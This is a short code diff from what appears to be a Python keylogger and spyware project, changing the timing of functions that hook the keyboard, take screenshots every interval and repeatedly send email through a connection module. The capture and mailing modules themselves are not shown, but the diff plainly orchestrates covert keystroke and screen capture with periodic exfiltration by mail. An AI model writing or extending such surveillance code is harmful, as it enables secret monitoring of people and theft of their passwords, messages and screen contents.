@@ -6,19 +6,18 @@ import time
 
 
 def keylogger():
-    while True:
-        Hook_Keyboard.hook_keyboard()
+    Hook_Keyboard.hook_keyboard()
 
 
 def screen():
     while True:
-        time.sleep(10)
+        time.sleep(100)
         PrintScreen.take_screen()
 
 
 def email():
     while True:
-        time.sleep(60)
+        time.sleep(600)
         Email_Connection.sendmail()
 
 
